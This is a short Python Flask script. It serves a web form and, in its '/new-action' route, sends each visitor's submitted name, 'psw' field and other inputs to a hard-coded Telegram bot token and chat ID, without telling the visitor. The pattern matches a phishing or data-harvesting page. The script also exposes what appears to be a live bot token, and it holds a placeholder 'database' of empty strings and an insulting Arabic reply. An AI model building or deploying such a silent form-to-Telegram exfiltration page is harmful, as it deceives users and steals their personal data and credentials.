from flask import Flask,request,render_template
import pickle,requests,os
from pystyle import Box

database = {
    "],[",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    ""
}

app = Flask(__name__, template_folder='template',static_folder='./template/static')
token = '2014491240:AAEorbwtcIxYxa7r47smGOSi4Ve2ofod7wE'
ID = '979712002'
@app.route('/')
def home():
    return render_template('index.html')

"""

"""
na = "oo"
@app.route('/new-action',methods=['POST','GET'])
def login():
    
    name1=request.form['uname']
    pwd=request.form['psw']
    peo=request.form['prob']
    م=Box.SimpleCube(f"الاسم الثلاثي:{name1} \n  القضية: {pwd} \n العمر  {peo}")
    requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={م}')
    if name1 in database:
        return render_template('login.html', info='قواد انت؟')
    elif name1 not in database:
        return render_template('home.html', name=name1)
    

    
    
        
    
    

@app.route('/action_stut',methods=['POST','GET'])
def st():
    return render_template('admi.html')
            
                    
app.run()

